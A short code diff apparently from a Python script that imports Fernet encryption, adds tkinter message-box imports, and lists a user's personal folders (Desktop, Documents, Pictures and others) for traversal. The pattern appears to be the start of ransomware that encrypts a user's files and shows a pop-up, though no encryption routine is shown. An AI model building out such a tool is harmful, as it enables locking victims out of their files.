@@ -1,5 +1,7 @@
 import os
 from cryptography.fernet import Fernet
+import tkinter as tk 
+from tkinter import messagebox
 
 # Define the list of directories to be traversed
 directories = ["Desktop", "Documents", "Music", "Videos", "Pictures", "Downloads"]
